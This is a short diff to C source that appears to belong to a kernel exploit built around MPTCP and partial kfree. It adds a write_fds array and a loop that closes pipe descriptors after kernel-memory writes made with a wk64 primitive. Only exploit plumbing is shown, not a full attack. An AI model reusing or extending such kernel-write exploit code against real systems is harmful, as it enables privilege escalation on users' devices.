@@ -117,6 +117,7 @@ void do_partial_kfree_with_socket(int fd, uint64_t kaddr, uint32_t n_bytes) {
 char* aaaas = NULL;
 
 int read_fds[10000] = {0};
+int write_fds[10000] = {0};
 int next_read_fd = 0;
 
 #define PIPE_SIZE 0x7ff
@@ -883,6 +884,11 @@ void mptcp_go() {
   wk64(pipe + 0x00, 0);
   wk64(pipe + 0x08, 0);
   wk64(pipe + 0x10, 0);
+  
+  for (int i = 0; i < next_read_fd; i++) {
+        close(write_fds[i]);
+        close(read_fds[i]);
+    }
   
   // do the same for the other end:
   ofiles_offset = ofiles_base + ((replacer_pipe+1) * 8);
